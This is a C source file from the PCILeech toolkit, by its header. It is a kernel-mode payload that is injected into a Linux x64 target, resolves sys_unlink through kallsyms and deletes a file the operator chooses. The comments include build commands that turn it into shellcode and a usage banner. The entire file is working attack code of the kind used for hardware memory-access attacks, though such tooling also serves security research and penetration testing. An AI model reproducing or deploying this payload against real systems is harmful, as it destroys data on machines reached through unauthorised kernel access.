// lx64_filedelete.c : kernel code to delete files from target system.
// Compatible with Linux x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_filedelete.c
// ml64 lx64_common_a.asm /Felx64_filedelete.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main lx64_filedelete.obj lx64_common.obj
// shellcode64.exe -o lx64_filedelete.exe "DELETE FILE ON TARGET SYSTEM                                   \nLINUX X64 EDITION                                              \n===============================================================\nDelete a specified file on the target system.                  \nREQUIRED OPTIONS:                                              \n  -s   : file on target system.                                \n         Example: '-s /tmp/file2delete'                        \n  -0   : run flag - set to non zero to delete file.            \n===== DETAILED RESULT INFORMATION =============================\nFILE NAME     : %s\nRESULT CODE   : 0x%08X\n==============================================================="
// 

#include "lx64_common.h"

typedef struct tdFN2 {
	QWORD str_sys_unlink;
	QWORD memcpy;
} FN2, *PFN2;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD NAMES[2];
	CHAR str_sys_unlink[] = { 's', 'y', 's', '_', 'u', 'n', 'l', 'i', 'n', 'k', 0 };
	CHAR str_memcpy[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
	NAMES[0] = (QWORD)str_sys_unlink;
	NAMES[1] = (QWORD)str_memcpy;
	return LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn2, 2);
}

VOID c_EntryPoint(PKMDDATA pk)
{
	FN2 fn2;
	QWORD qwResult;
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	SysVCall(fn2.memcpy, pk->dataOutStr, pk->dataInStr, MAX_PATH);
	if(!pk->dataIn[0]) {
		pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
		return;
	}
	qwResult = SysVCall(fn2.str_sys_unlink, pk->dataInStr);
	if(qwResult) {
		pk->dataOut[0] = STATUS_FAIL_ACTION;
		return;
	}
}